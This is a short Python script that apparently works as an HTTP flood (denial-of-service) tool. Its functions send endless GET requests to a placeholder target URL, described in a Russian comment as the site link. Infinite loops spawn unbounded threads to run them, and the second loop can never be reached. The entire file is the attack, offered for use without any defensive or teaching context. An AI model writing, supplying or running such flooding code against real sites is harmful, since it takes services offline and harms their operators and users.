import threading
import requests
import time
import sys

def dos():
 while True:
  requests.get("ССЛЫКА НА САЙТ ВМЕСТЕ С http:// или https://")
while True:
 threading.Thread(target=dos).start()

def dos2():
 while True:
  requests.get("ССЛЫКА НА САЙТ ВМЕСТЕ С http:// или https://")
while True:
 threading.Thread(target=dos2).start()

 